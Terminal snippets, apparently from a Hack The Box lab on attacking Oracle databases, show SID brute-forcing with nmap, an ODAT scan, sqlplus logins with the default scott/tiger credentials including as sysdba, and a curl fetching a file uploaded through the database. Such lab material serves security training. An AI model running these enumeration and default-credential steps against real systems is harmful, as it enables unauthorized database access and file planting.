...
```
xnoxos@htb[/htb]$ ./odat.py -husage: odat.py [-h] [--version]
...
```
xnoxos@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --openStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
...
```
xnoxos@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-bruteStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
...
```
xnoxos@htb[/htb]$ ./odat.py all -s 10.129.204.235[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
...
```
xnoxos@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XESQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0
...
```
xnoxos@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdbaSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0
...
```
xnoxos@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txtOracle File Upload Test
```